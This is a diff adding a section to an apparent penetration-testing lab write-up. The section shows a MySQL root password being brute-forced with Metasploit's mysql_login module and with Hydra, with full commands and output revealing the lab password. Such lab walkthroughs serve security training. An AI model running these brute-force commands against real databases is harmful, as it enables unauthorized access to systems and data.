@@ -401,4 +401,43 @@ PORT     STATE SERVICE VERSION
 MAC Address: 02:42:C0:15:A1:03 (Unknown)
 ```
 
+***
+
+## MySQL Dictionary Attack
+
+To brute force the login credentials, we can use the msfconsole:
+
+<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/mysql/mysql_login 
+msf5 auxiliary(scanner/mysql/mysql_login) > set rhosts 192.28.228.3
+rhosts => 192.28.228.3
+msf5 auxiliary(scanner/mysql/mysql_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+msf5 auxiliary(scanner/mysql/mysql_login) > set verbose false
+verbose => false
+msf5 auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
+stop_on_success => true
+msf5 auxiliary(scanner/mysql/mysql_login) > set username root
+username => root
+msf5 auxiliary(scanner/mysql/mysql_login) > run
+
+<strong>[+] 192.28.228.3:3306     - 192.28.228.3:3306 - Success: 'root:catalina'
+</strong>[*] 192.28.228.3:3306     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+Here we got the password for root.
+
+We can do the same thing using Hydra:
+
+<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.28.228.3 mysql
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-29 09:27:55
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
+[DATA] attacking mysql://192.28.228.3:3306/
+<strong>[3306][mysql] host: 192.28.228.3   login: root   password: catalina
+</strong>1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+
 [^1]: setg is used to declare the rhosts as global so that we don't have to specify it again and again in a single session.
